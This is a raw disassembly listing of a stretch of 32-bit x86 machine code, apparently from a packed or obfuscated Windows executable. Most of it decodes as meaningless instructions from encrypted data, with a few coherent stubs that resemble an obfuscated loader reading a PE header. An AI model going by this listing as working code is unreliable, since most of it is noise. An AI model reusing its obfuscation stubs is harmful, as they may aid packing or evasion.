  417ffa:	sub    al,0xb5
  417ffc:	adc    eax,0x4fba88db
  418001:	outs   dx,BYTE PTR ds:[esi]
  418002:	push   esp
  418003:	sub    al,0x3c
  418005:	inc    ebx
  418006:	fiadd  WORD PTR [edx-0x7d783f1b]
  41800c:	out    0xe6,eax
  41800e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41800f:	mov    dh,0x21
  418011:	push   esp
  418012:	add    DWORD PTR [ebx-0x53],edi
  418015:	popf   
  418016:	ds mov ecx,0x2a36d1f4
  41801c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41801d:	dec    ebp
  41801e:	push   ecx
  41801f:	add    eax,0xeb47f0ec
  418024:	(bad)  [eax+0x52]
  418027:	lea    ecx,[edx-0x1d]
  41802a:	dec    ecx
  41802b:	(bad)  
  41802c:	nop
  41802d:	xchg   esi,eax
  41802e:	push   edi
  41802f:	mov    cl,0x71
  418031:	iret   
  418032:	xor    edi,DWORD PTR ds:0xb9d42a18
  418038:	pop    eax
  418039:	pop    ebp
  41803a:	mov    ecx,0xe8893837
  41803f:	outs   dx,BYTE PTR ds:[esi]
  418040:	out    0x3,al
  418042:	mov    esi,0x6e64026a
  418047:	popa   
  418048:	jecxz  0x418078
  41804a:	enter  0x7c11,0xd2
  41804e:	aaa    
  41804f:	dec    ebp
  418050:	sub    esp,edi
  418052:	lahf   
  418053:	fisub  WORD PTR [ebp+ebx*1+0x7f]
  418057:	clc    
  418058:	mov    al,ds:0x88d52f75
  41805d:	(bad)  
  41805e:	push   ecx
  41805f:	mov    DWORD PTR [edx-0x79],ebp
  418062:	fiadd  WORD PTR [eax+0x5312f3b7]
  418068:	dec    ecx
  418069:	sub    al,0x3b
  41806b:	mov    ds:0x4dd245c6,eax
  418070:	sub    eax,0x85cb15f7
  418075:	jg     0x41806a
  418077:	mov    edx,0x752e7164
  41807c:	push   es
  41807d:	push   ebx
  41807e:	das    
  41807f:	js     0x418012
  418081:	sub    BYTE PTR [ecx],dl
  418083:	xchg   ecx,eax
  418084:	pop    esi
  418085:	inc    ebx
  418086:	mov    ds:0xfd3af7cc,eax
  41808b:	je     0x418087
  41808d:	paddusb mm3,mm6
  418090:	mov    bl,0x80
  418092:	xor    esi,edx
  418094:	xchg   DWORD PTR [edx+0x38701eff],ebx
  41809a:	dec    edx
  41809b:	sbb    ah,0x1e
  41809e:	and    eax,0xbd261908
  4180a3:	fld    st(1)
  4180a5:	jae    0x41804a
  4180a7:	adc    al,0x33
  4180a9:	push   ss
  4180aa:	and    DWORD PTR [ebx],0xffffff9f
  4180ad:	mov    edx,0x7a66a075
  4180b2:	xor    eax,0x2a9df7b1
  4180b7:	adc    eax,0x44d5342b
  4180bc:	mov    DWORD PTR [ecx+0x21],esp
  4180bf:	adc    ch,BYTE PTR ds:0x8fe3853a
  4180c5:	mov    esi,0xf14747f0
  4180ca:	outs   dx,DWORD PTR ds:[esi]
  4180cb:	mov    BYTE PTR [edi+eiz*1+0x1],ch
  4180cf:	(bad)  
  4180d0:	sub    eax,0x44e2d5eb
  4180d5:	inc    DWORD PTR [esp+ebx*1+0x2d599bcd]
  4180dc:	add    DWORD PTR [esi],0x2697577b
  4180e2:	push   ebx
  4180e3:	enter  0x5103,0x90
  4180e7:	stc    
  4180e8:	fs lahf 
  4180ea:	clc    
  4180eb:	and    ebx,edx
  4180ed:	and    esp,DWORD PTR [ebp-0x6b]
  4180f0:	lods   al,BYTE PTR ds:[esi]
  4180f1:	fdivr  QWORD PTR [ebp+0x5699a14e]
  4180f7:	lds    esi,FWORD PTR [ebx+0x11]
  4180fa:	and    ecx,DWORD PTR [ecx-0x29d123cd]
  418100:	sahf   
  418101:	jbe    0x4180e4
  418103:	repnz adc ebx,DWORD PTR [esi+0x30adf403]
  41810a:	repnz icebp 
  41810c:	jmp    0x418124
  41810e:	push   DWORD PTR [esi+eiz*4+0x51]
  418112:	inc    esp
  418113:	mov    eax,0xd8dae095
  418118:	jns    0x4180a0
  41811a:	or     BYTE PTR [edx-0x3f],0x46
  41811e:	(bad)  
  41811f:	push   esi
  418120:	loopne 0x4180b9
  418122:	push   edx
  418123:	jo     0x4180db
  418125:	pop    ebx
  418126:	aaa    
  418127:	adc    edx,esp
  418129:	call   0x7079:0x311f
  41812f:	xchg   ecx,eax
  418130:	jecxz  0x4180f0
  418132:	xor    esi,DWORD PTR [ebx]
  418134:	mov    dh,0x57
  418136:	jbe    0x41811f
  418138:	or     eax,0x8f84ea9b
  41813d:	mov    ds:0xbf675b66,al
  418142:	xchg   ebp,eax
  418143:	pop    ds
  418144:	iret   
  418145:	(bad)  
  418146:	adc    ah,BYTE PTR [esi+0x7]
  418149:	dec    esp
  41814a:	aas    
  41814b:	mov    ds:0xe2e24d4c,al
  418150:	repnz aas 
  418152:	les    esi,FWORD PTR [edi+0x1fb77c34]
  418158:	jnp    0x418117
  41815a:	sbb    al,0xf4
  41815c:	inc    ebx
  41815d:	fwait
  41815e:	test   al,0x75
  418160:	mov    eax,0x512d5696
  418165:	cmp    edi,esi
  418167:	imul   ebp,DWORD PTR [eax+0x70a8fabc],0xdb298247
  418171:	push   ss
  418172:	adc    bl,bl
  418174:	pop    ss
  418175:	pop    edx
  418176:	push   ebx
  418177:	mov    ds:0x990c50a4,eax
  41817c:	(bad)  
  41817d:	nop
  41817e:	jno    0x418115
  418180:	gs mov eax,0x6bffc248
  418186:	push   cs
  418187:	push   esp
  418188:	or     bh,BYTE PTR [ebp-0x4453aaa5]
  41818e:	shl    DWORD PTR [ecx+ebx*1+0x456c2c33],0xff
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	ss add eax,0x3419e2c4
  4181bd:	jg     0x418237
  4181bf:	jnp    0x41823f
  4181c1:	js     0x41823b
  4181c3:	aas    
  4181c4:	xchg   BYTE PTR [edi+0x13],cl
  4181c7:	popf   
  4181c8:	pop    eax
  4181c9:	lahf   
  4181ca:	popf   
  4181cb:	sub    al,0xd2
  4181cd:	aas    
  4181ce:	pop    eax
  4181cf:	rol    DWORD PTR [edi+0x759e8cc4],cl
  4181d5:	adc    al,BYTE PTR [ecx-0x1b73f94]
  4181db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181dc:	xchg   esp,eax
  4181dd:	xor    ebx,DWORD PTR [edx+eax*4-0x24bbfc73]
  4181e4:	retf   
  4181e5:	mov    DWORD PTR [esi],ebx
  4181e7:	xor    esp,DWORD PTR ds:0x675bbca1
  4181ed:	pop    ebx
  4181ee:	(bad)  
  4181ef:	imul   ebp,DWORD PTR [esp+ebx*2+0x3e],0xffffff94
  4181f4:	pop    ss
  4181f5:	fidivr WORD PTR [ebp-0x2]
  4181f8:	sub    eax,0x395b95c4
  4181fd:	mov    dl,0x9c
  4181ff:	jg     0x4181c8
  418201:	jecxz  0x418258
  418203:	inc    esi
  418204:	out    dx,al
  418205:	push   DWORD PTR [edi+0x46dd02fb]
  41820b:	ss je  0x418219
  41820e:	ret    
  41820f:	sub    edi,0x59
  418212:	loop   0x418271
  418214:	aam    0xa7
  418216:	xchg   edx,eax
  418217:	or     eax,0xa14f5e0e
  41821c:	cmp    eax,0x46611d9d
  418221:	pop    edx
  418222:	(bad)  
  418223:	bound  ebx,QWORD PTR [edi]
  418225:	mov    ds:0xc6a66acf,al
  41822a:	inc    edi
  41822b:	js     0x4181e1
  41822d:	pop    esi
  41822e:	std    
  41822f:	and    DWORD PTR [edx],ebx
  418231:	scas   al,BYTE PTR es:[edi]
  418232:	popa   
  418233:	push   edx
  418234:	ret    
  418235:	dec    esp
  418236:	mov    eax,0xa1fdf300
  41823b:	int3   
  41823c:	hlt    
  41823d:	cmc    
  41823e:	sbb    DWORD PTR [esi+0x3d],esp
  418241:	dec    edi
  418242:	faddp  st(3),st
  418244:	mov    edx,0x965ee6fd
  418249:	leave  
  41824a:	xchg   esp,eax
  41824b:	xor    eax,0x1170ca77
  418250:	xor    al,0xb9
  418252:	es mov esi,0x64133108
  418258:	call   0xea2d:0x70375aca
  41825f:	push   es
  418260:	add    edi,DWORD PTR [esi+0xc]
  418263:	leave  
  418264:	jecxz  0x418276
  418266:	pop    ebx
  418267:	mov    esi,0x8a55b28c
  41826c:	add    bl,BYTE PTR [esi+esi*4]
  41826f:	sbb    al,0x7d
  418271:	xchg   esp,eax
  418272:	sub    al,0xcf
  418274:	mul    esi
  418276:	(bad)  
  418277:	dec    esi
  418278:	fld    QWORD PTR [ebx+0x1e]
  41827b:	xor    esp,DWORD PTR [ebx+0x45]
  41827e:	cmp    eax,0x1d28893d
  418283:	xor    eax,0x710761b5
  418288:	call   0x7d88:0xe2a738c1
  41828f:	dec    esi
  418290:	test   DWORD PTR [edi+0x45f39c56],edx
  418296:	mov    ebp,esi
  418298:	sub    esp,DWORD PTR [edx-0x15280c38]
  41829e:	inc    ebp
  41829f:	shl    edx,cl
  4182a1:	loopne 0x418270
  4182a3:	scas   al,BYTE PTR es:[edi]
  4182a4:	and    ch,BYTE PTR [ebx+0x71]
  4182a7:	xor    eax,0xb216e544
  4182ac:	call   0xbb91:0x3318af89
  4182b3:	xchg   DWORD PTR [eax+0x7d],edi
  4182b6:	popa   
  4182b7:	and    al,bl
  4182b9:	in     al,dx
  4182ba:	nop
  4182bb:	mov    eax,0x2844c3b
  4182c0:	mov    eax,0xbb0199aa
  4182c5:	xchg   esp,eax
  4182c6:	sti    
  4182c7:	jae    0x4182c0
  4182c9:	dec    ecx
  4182ca:	arpl   di,bx
  4182cc:	push   ebp
  4182cd:	xchg   BYTE PTR [ecx-0x76],dh
  4182d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182d1:	popf   
  4182d2:	inc    ebp
  4182d3:	adc    edx,esi
  4182d5:	jge    0x4182ea
  4182d7:	jns    0x418314
  4182d9:	fwait
  4182da:	imul   BYTE PTR [esi+0x3f577af7]
  4182e0:	test   dh,ah
  4182e2:	(bad)  
  4182e3:	xadd   edi,ebx
  4182e6:	cmp    esp,DWORD PTR [esi-0x3f772654]
  4182ec:	fidiv  DWORD PTR [edx]
  4182ee:	jnp    0x4182e8
  4182f0:	cs mov ebx,0xa284e62e
  4182f6:	sub    BYTE PTR [edi+eiz*8],0xa8
  4182fa:	sahf   
  4182fb:	out    0xd5,eax
  4182fd:	lahf   
  4182fe:	scas   al,BYTE PTR es:[edi]
  4182ff:	push   edi
  418300:	pop    edx
  418301:	jecxz  0x4182ce
  418303:	cmp    esp,0xc9bc936e
  418309:	and    al,0x14
  41830b:	cs pop ebp
  41830d:	and    eax,0x49ad4f8d
  418312:	nop
  418313:	cld    
  418314:	sub    eax,0xd0fe6db4
  418319:	loope  0x4182a2
  41831b:	push   edx
  41831c:	jns    0x4182e1
  41831e:	cmp    BYTE PTR [eax+edi*2],0x83
  418322:	(bad)  
  418324:	sbb    edx,DWORD PTR [edx+0x75645b54]
  41832a:	arpl   WORD PTR [ebx],di
  41832c:	popa   
  41832d:	and    BYTE PTR [edi],dh
  41832f:	mov    BYTE PTR [edi],ch
  418331:	xchg   edi,eax
  418332:	fidiv  DWORD PTR [eax+ebx*4+0x4e]
  418336:	xchg   esi,edx
  418338:	push   edx
  418339:	mov    BYTE PTR [esi+0x68],0x71
  41833d:	add    eax,0x4bbc8c28
  418342:	xor    edi,ebx
  418344:	push   edx
  418345:	pcmpgtb mm1,mm4
  418348:	stos   BYTE PTR es:[edi],al
  418349:	xchg   ebp,eax
  41834a:	stos   BYTE PTR es:[edi],al
  41834b:	addr16 mov ah,0xf8
  41834e:	sbb    eax,edx
  418350:	pop    esp
  418351:	xchg   edi,eax
  418352:	rcl    DWORD PTR [eax-0xd3fc85b],cl
  418358:	and    eax,0xe0d9cd17
  41835d:	pop    ss
  41835e:	stc    
  41835f:	cli    
  418360:	retf   0x4925
  418363:	iret   
  418364:	(bad)  
  418365:	cli    
  418366:	push   0xb
  418368:	rcr    dh,1
  41836a:	fnsave [esi-0x21]
  41836d:	adc    dl,BYTE PTR [esi+0x6b9feb37]
  418373:	sbb    bl,cl
  418375:	inc    ecx
  418376:	mov    bl,0x3b
  418378:	test   al,0xa
  41837a:	iret   
  41837b:	clc    
  41837c:	push   ebp
  41837d:	dec    edx
  41837e:	or     al,0xf6
  418380:	in     eax,dx
  418381:	or     al,0xb9
  418383:	clc    
  418384:	fidiv  DWORD PTR [esi+0x30ac64e5]
  41838a:	jge    0x4183d3
  41838c:	in     eax,dx
  41838d:	aam    0x4e
  41838f:	js     0x4183c0
  418391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418392:	push   eax
  418393:	fwait
  418394:	mov    ecx,0xb4d0ae7c
  418399:	ret    
  41839a:	pop    ss
  41839b:	jecxz  0x418346
  41839d:	push   ebx
  41839e:	inc    eax
  41839f:	popa   
  4183a0:	dec    eax
  4183a1:	into   
  4183a2:	cs xchg edi,eax
  4183a4:	or     eax,0xee3fa31e
  4183a9:	add    al,0x48
  4183ab:	dec    DWORD PTR [eax-0x3a]
  4183ae:	xchg   edi,eax
  4183af:	call   0x9d81:0x6a212366
  4183b6:	retf   0xd424
  4183b9:	xchg   edx,eax
  4183ba:	into   
  4183bb:	(bad)  
  4183bc:	jmp    0xd16986ec
  4183c1:	jo     0x4183f0
  4183c3:	mov    dl,BYTE PTR [edi-0xad998bc]
  4183c9:	cmp    DWORD PTR [ebx-0x7d88e603],esp
  4183cf:	les    edi,FWORD PTR [esp+eiz*8-0x40]
  4183d3:	pop    ds
  4183d4:	rcr    BYTE PTR [esi-0x6433ed8a],cl
  4183da:	sbb    bh,dh
  4183dc:	adc    al,0xa7
  4183de:	je     0x418435
  4183e0:	das    
  4183e1:	pop    esi
  4183e2:	push   ss
  4183e3:	push   esp
  4183e4:	scas   al,BYTE PTR es:[edi]
  4183e5:	pushf  
  4183e6:	mov    bh,0xbf
  4183e8:	shl    DWORD PTR ds:0x30fde5df,cl
  4183ee:	je     0x418404
  4183f0:	sbb    esi,DWORD PTR [esi+0xa]
  4183f3:	leave  
  4183f4:	cs or  eax,0x35da8487
  4183fa:	fdivr  DWORD PTR [ebp-0x7965a178]
  418400:	fidivr WORD PTR [esi]
  418402:	outs   dx,BYTE PTR ds:[esi]
  418403:	adc    ebp,edx
  418405:	sahf   
  418406:	mov    DWORD PTR [edx],edx
  418408:	dec    esi
  418409:	sub    BYTE PTR [ebp-0x56bf96df],ah
  41840f:	sbb    eax,0x13325098
  418414:	test   BYTE PTR [ebx+0x7c],ah
  418417:	scas   al,BYTE PTR es:[edi]
  418418:	sbb    DWORD PTR [ecx-0x16],ebp
  41841b:	pop    eax
  41841c:	in     eax,0x5e
  41841e:	xor    esi,DWORD PTR [ebp-0x4a]
  418421:	and    eax,0xbc4fd16c
  418426:	dec    esp
  418427:	fbstp  TBYTE PTR [ebx]
  418429:	jle    0x4184a3
  41842b:	jl     0x418455
  41842d:	xchg   DWORD PTR [eax+eax*8-0x4a],ebp
  418431:	lahf   
  418432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418433:	add    BYTE PTR [edx],al
  418435:	sbb    BYTE PTR [esi+0x5ebea9f4],bl
  41843b:	sub    edi,eax
  41843d:	lods   eax,DWORD PTR ds:[esi]
  41843e:	lods   al,BYTE PTR ds:[esi]
  41843f:	in     al,0x13
  418441:	in     eax,dx
  418442:	pop    ss
  418443:	sbb    dh,BYTE PTR [esi+0x1]
  418446:	and    ch,BYTE PTR [edi+0x59]
  418449:	or     DWORD PTR [ecx-0x42],esp
  41844c:	jle    0x4183dd
  41844e:	retf   
  41844f:	mov    ecx,es
  418451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418452:	mov    DWORD PTR [edx],edx
  418454:	mov    DWORD PTR [edi-0x64],edi
  418457:	sbb    edx,DWORD PTR [esp+ebx*2-0x77]
  41845b:	out    0xcc,al
  41845d:	in     eax,dx
  41845e:	mov    ebp,0xb86d95a7
  418463:	sub    eax,0x29eab731
  418468:	xchg   ebp,eax
  418469:	fidiv  WORD PTR [edx+0x4a]
  41846c:	mov    WORD PTR [ecx+esi*2+0x3219c85f],fs
  418473:	aam    0x9f
  418475:	add    bl,dh
  418477:	sahf   
  418478:	adc    BYTE PTR [ecx],0x28
  41847b:	sbb    BYTE PTR [edx],dh
  41847d:	fsubr  QWORD PTR [esi-0x4363c1b7]
  418483:	mov    WORD PTR [ecx+0x1e],?
  418486:	xchg   ebx,eax
  418487:	mov    dl,0x30
  418489:	jp     0x418462
  41848b:	push   esp
  41848c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41848e:	out    dx,eax
  41848f:	push   0xffffffbd
  418491:	jmp    0x1ede9c9d
  418496:	mov    WORD PTR ss:[ecx-0x48],cs
  41849a:	stos   DWORD PTR es:[edi],eax
  41849b:	mov    ds:0xea6c3f09,eax
  4184a0:	or     bh,dl
  4184a2:	pusha  
  4184a3:	rcl    BYTE PTR [edi+0x58],cl
  4184a6:	mov    bl,0x97
  4184a8:	push   ebx
  4184a9:	imul   esi,DWORD PTR [edx-0xe],0xffffffc1
  4184ad:	out    0xae,eax
  4184af:	cld    
  4184b0:	sbb    dl,BYTE PTR [ebx]
  4184b2:	dec    edi
  4184b3:	dec    ebx
  4184b4:	iret   
  4184b5:	mov    dh,BYTE PTR [edx-0x10]
  4184b8:	dec    eax
  4184b9:	adc    esi,ecx
  4184bb:	pop    esi
  4184bc:	ja     0x418496
  4184be:	pushw  ss
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x2cec6d48
  4184e3:	push   esp
  4184e4:	jne    0x41851f
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	ds stc 
  4184f0:	in     al,dx
  4184f1:	mov    cl,0x0
  4184f3:	out    dx,eax
  4184f4:	xchg   ebx,eax
  4184f5:	mov    al,0x31
  4184f7:	adc    dl,BYTE PTR [eax+0x51]
  4184fa:	dec    ebx
  4184fb:	push   esp
  4184fc:	shl    BYTE PTR ds:0x19c2f158,0x77
  418503:	(bad)  
  418504:	push   esp
  418505:	cmp    dh,dh
  418507:	leave  
  418508:	mov    al,0xd2
  41850a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850b:	mov    ebp,0xe892e447
  418510:	test   DWORD PTR [esi],ebx
  418512:	int3   
  418513:	stos   DWORD PTR es:[edi],eax
  418514:	idiv   BYTE PTR [edx+0x42cd5a92]
  41851a:	inc    eax
  41851b:	cmp    ch,BYTE PTR [ecx+edi*1-0x4e4223d9]
  418522:	stos   DWORD PTR es:[edi],eax
  418523:	dec    ecx
  418524:	jns    0x41852a
  418526:	test   eax,0x142eddfa
  41852b:	adc    DWORD PTR [ebx+0x10d11604],0x3e
  418532:	out    0xd3,eax
  418534:	push   edi
  418535:	mov    ebp,0x6aaf15da
  41853a:	call   0x25bc2d9a
  41853f:	mov    edi,0x6e0e9a61
  418544:	retf   0xec91
  418547:	mov    ebp,0xb12b0dce
  41854c:	dec    ebx
  41854d:	aad    0xbf
  41854f:	arpl   WORD PTR [edx+0x3d8c8b36],ax
  418555:	leave  
  418556:	and    eax,0x2a4b4901
  41855b:	mov    esi,0x1adc87f2
  418560:	push   0x765775a5
  418565:	lds    esi,FWORD PTR [edi-0x1e]
  418568:	std    
  418569:	or     bh,dl
  41856b:	mov    al,ss:0xfe6f7c08
  418571:	(bad)  
  418572:	xor    al,0x96
  418574:	fs addr16 jno 0x4185e3
  418578:	lea    edi,[eax]
  41857a:	pop    esi
  41857b:	and    DWORD PTR [edi],ecx
  41857d:	add    BYTE PTR [esi-0x2055b8af],dl
  418583:	fsub   DWORD PTR [eax*1-0x28c9f724]
  41858a:	mov    cl,al
  41858c:	nop
  41858d:	pop    edx
  41858e:	in     eax,dx
  41858f:	outs   dx,BYTE PTR ds:[esi]
  418590:	jg     0x41854f
  418592:	dec    esp
  418593:	leave  
  418594:	test   DWORD PTR [edx],ecx
  418596:	pusha  
  418597:	in     eax,dx
  418598:	inc    eax
  418599:	xchg   esp,eax
  41859a:	xor    al,0x42
  41859c:	retf   0xa63b
  41859f:	or     al,0x35
  4185a1:	cwde   
  4185a2:	test   al,0x7b
  4185a4:	sub    eax,0xecb26672
  4185a9:	cmp    edi,DWORD PTR [eax]
  4185ab:	jle    0x4185ca
  4185ad:	jg     0x41854e
  4185af:	out    dx,al
  4185b0:	push   0x67412e08
  4185b5:	enter  0x9ded,0x92
  4185b9:	ja     0x41853e
  4185bb:	rcr    BYTE PTR [esi+eiz*8-0x27619d53],0xca
  4185c3:	in     al,dx
  4185c4:	out    dx,al
  4185c5:	and    ebp,DWORD PTR [eax-0x403bdcd4]
  4185cb:	aaa    
  4185cc:	daa    
  4185cd:	sahf   
  4185ce:	pop    es
  4185cf:	inc    eax
  4185d0:	xor    edx,DWORD PTR [eax-0x774fd3f]
  4185d6:	les    eax,FWORD PTR [ecx+0x49afc398]
  4185dc:	inc    ebp
  4185dd:	mov    ebp,0xee3df0e
  4185e2:	adc    BYTE PTR [esi+eax*1-0x7d],dh
  4185e6:	rcr    DWORD PTR [ebx+0x11],cl
  4185e9:	mov    ds:0x7af0c673,al
  4185ee:	fbld   TBYTE PTR [ebx]
  4185f0:	inc    esp
  4185f1:	mov    cl,0x5
  4185f3:	cli    
  4185f4:	sub    DWORD PTR [ebx+0x7d455c59],edi
  4185fa:	adc    DWORD PTR [esi],edi
  4185fc:	sahf   
  4185fd:	mov    ebx,0x8624bd0e
  418602:	aas    
  418603:	sti    
  418604:	ficom  DWORD PTR [ebx+0x71bbbfe1]
  41860a:	xor    BYTE PTR [ebp-0x57],al
  41860d:	jp     0x4185c5
  41860f:	inc    edx
  418610:	sub    eax,0xe5f3eb21
  418615:	loopne 0x418692
  418617:	out    0x8d,eax
  418619:	mov    al,ds:0x2e645556
  41861e:	or     ebx,DWORD PTR [edi-0x3a]
  418621:	das    
  418622:	pop    esi
  418623:	jns    0x41862c
  418625:	and    edi,DWORD PTR [ecx]
  418627:	fbld   TBYTE PTR [ebx]
  418629:	mov    eax,0xdb89b9bb
  41862e:	fcomp  DWORD PTR [edx]
  418630:	fldenv [esi-0x18]
  418633:	jae    0x41863a
  418635:	and    BYTE PTR [eax+0x6a23dfde],dl
  41863b:	push   ds
  41863c:	xchg   ecx,eax
  41863d:	call   0x769da525
  418642:	add    esi,DWORD PTR es:[bp+0x5b]
  418647:	adc    edi,DWORD PTR [edx-0x1c156bae]
  41864d:	mov    al,ds:0x9b6962e2
  418652:	pop    edx
  418654:	mov    ds:0x9ad78076,al
  418659:	mov    ss,WORD PTR [edx+0x5b06a872]
  41865f:	(bad)  
  418660:	lods   eax,DWORD PTR ds:[esi]
  418661:	cs aaa 
  418663:	sub    al,0xa3
  418665:	add    DWORD PTR [eax+0x57],edi
  418668:	gs ins DWORD PTR es:[edi],dx
  41866a:	test   al,0xd4
  41866c:	sub    ebx,DWORD PTR [eax]
  41866e:	fs out dx,eax
  418670:	retf   
  418671:	jns    0x4186de
  418673:	sbb    BYTE PTR gs:[ebp+0x548bb36a],ch
  41867a:	sub    eax,0x97faa928
  41867f:	sbb    eax,DWORD PTR [edx-0x30275e9e]
  418685:	or     eax,0xed2e016d
  41868a:	scas   eax,DWORD PTR es:[edi]
  41868b:	push   0x7e9edc3a
  418690:	imul   esp,DWORD PTR ds:[ebp+0x35],0xd51f2f9a
  418698:	fld    QWORD PTR ds:0x2be55ed1
  41869e:	dec    ebp
  41869f:	jg     0x418680
  4186a1:	arpl   WORD PTR [ecx-0x1c],dx
  4186a4:	mov    ah,0xfe
  4186a6:	fimul  WORD PTR [ecx]
  4186a8:	stos   DWORD PTR es:[edi],eax
  4186a9:	pop    ebp
  4186aa:	mov    WORD PTR [edx-0x35],?
  4186ad:	icebp  
  4186ae:	outs   dx,BYTE PTR ds:[esi]
  4186af:	int    0x88
  4186b1:	scas   eax,DWORD PTR es:[edi]
  4186b2:	cmp    DWORD PTR ds:0x2ab72189,esi
  4186b8:	mov    esi,0x51bbcbdf
  4186bd:	mov    edx,0x804bccc5
  4186c2:	sub    bh,bl
  4186c4:	inc    eax
  4186c5:	bound  esi,QWORD PTR [eax]
  4186c7:	(bad)  
  4186c8:	xor    DWORD PTR [ebx-0x2270d5ab],ebp
  4186ce:	sbb    al,0xce
  4186d0:	out    dx,eax
  4186d1:	(bad)  
  4186d2:	adc    BYTE PTR [ebx],cl
  4186d4:	push   edx
  4186d5:	daa    
  4186d6:	out    dx,al
  4186d7:	out    0x4b,al
  4186d9:	jmp    DWORD PTR [edi+0x6e]
  4186dc:	jb     0x4186b9
  4186de:	sbb    ecx,DWORD PTR [edi]
  4186e0:	sar    ebp,1
  4186e2:	iret   
  4186e3:	std    
  4186e4:	mov    ebp,0x843f883
  4186e9:	push   ecx
  4186ea:	out    dx,eax
  4186eb:	ret    0xd302
  4186ee:	loopne 0x41872b
  4186f0:	daa    
  4186f1:	stos   DWORD PTR es:[edi],eax
  4186f2:	and    bl,BYTE PTR [eax+0x7e]
  4186f5:	push   es
  4186f6:	mov    eax,0xda1b12
  4186fb:	std    
  4186fc:	std    
  4186fd:	sub    dl,BYTE PTR [ebp-0x5bb0a4c8]
  418703:	jnp    0x4186a9
  418705:	gs (bad) 
  418707:	imul   edx,edx,0x23
  41870a:	adc    bl,BYTE PTR fs:[ebx]
  41870d:	scas   al,BYTE PTR es:[edi]
  41870e:	fwait
  41870f:	push   0xf2feef93
  418714:	xchg   ebp,eax
  418715:	pop    esp
  418716:	pop    edi
  418717:	not    BYTE PTR [ecx]
  418719:	xchg   ebx,eax
  41871a:	jo     0x4186d8
  41871c:	cmp    BYTE PTR [eax],dl
  41871e:	sbb    eax,0x618c42a5
  418723:	push   0x7a
  418725:	ins    BYTE PTR es:[edi],dx
  418726:	call   0xe8315938
  41872b:	xchg   BYTE PTR [edx+0x36],dh
  41872e:	fxch   st(2)
  418730:	sub    eax,0x9c92ac0b
  418735:	lahf   
  418736:	add    eax,0xe5884aca
  41873b:	xchg   ecx,eax
  41873c:	stos   DWORD PTR es:[edi],eax
  41873d:	push   cs
  41873e:	(bad)
  418741:	das    
  418742:	rol    DWORD PTR [ecx],cl
  418744:	fstp   TBYTE PTR [eax+0x7ba0daed]
  41874a:	xchg   esp,eax
  41874b:	repnz xchg ebp,eax
  41874d:	fcomip st,st(0)
  41874f:	cmp    esp,DWORD PTR [eax]
  418751:	sub    eax,0x4edcd798
  418756:	pop    ebx
  418757:	mov    BYTE PTR [ebp+0x2f],al
  41875a:	xchg   esi,eax
  41875b:	push   esp
  41875c:	mov    eax,0xd473087e
  418761:	and    ecx,DWORD PTR ds:0xbf346c72
  418767:	xor    eax,0x8d597f0
  41876c:	stos   DWORD PTR es:[edi],eax
  41876d:	mov    eax,ds:0x766e15b9
  418772:	icebp  
  418773:	int3   
  418774:	sub    edi,0xffffffa5
  418777:	inc    esi
  418778:	add    DWORD PTR [esi+0x56],ebp
  41877b:	test   BYTE PTR [eax+edx*8-0x26ee798],0xe3
  418783:	sbb    BYTE PTR [ecx-0x7eac82d8],dl
  418789:	jbe    0x418766
  41878b:	icebp  
  41878c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41878d:	sar    DWORD PTR [eax],cl
  41878f:	xchg   ebx,eax
  418790:	push   ebp
  418791:	mov    eax,0xb59a7b5e
  418796:	mov    al,ds:0x9188a9d
  41879b:	mov    ecx,0xc0db9e57
  4187a0:	ficom  WORD PTR [edi-0xa]
  4187a3:	test   BYTE PTR [ebx],cl
  4187a5:	jmp    0x169820fa
  4187aa:	jp     0x418825
  4187ac:	neg    DWORD PTR [eax]
  4187ae:	(bad)
  4187b2:	cmp    DWORD PTR [esi+0x69e6808f],ecx
  4187b8:	shl    BYTE PTR [ecx-0x78],0x6f
  4187bc:	or     al,0x0
  4187be:	dec    edi
  4187bf:	popa   
  4187c0:	inc    edi
  4187c1:	nop
  4187c2:	ja     0x418833
  4187c4:	push   edi
  4187c5:	repz adc al,0x28
  4187c8:	push   esi
  4187c9:	(bad)  
  4187ca:	cwde   
  4187cb:	mov    ebp,DWORD PTR [edi-0x3928a9c8]
  4187d1:	in     al,dx
  4187d2:	and    eax,0xf0e2b656
  4187d7:	pop    es
  4187d8:	adc    al,0xbf
  4187da:	out    0x2b,al
  4187dc:	xor    edx,ebp
  4187de:	mov    bl,0xb9
  4187e0:	push   edx
  4187e1:	stc    
  4187e2:	and    al,BYTE PTR [eax-0x4b95b708]
  4187e8:	push   0xffffffc2
  4187ea:	jb     0x41876d
  4187ec:	shr    DWORD PTR [eax-0x73],0xcd
  4187f0:	dec    DWORD PTR [ebx+0x3f033f1]
  4187f6:	jne    0x418800
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
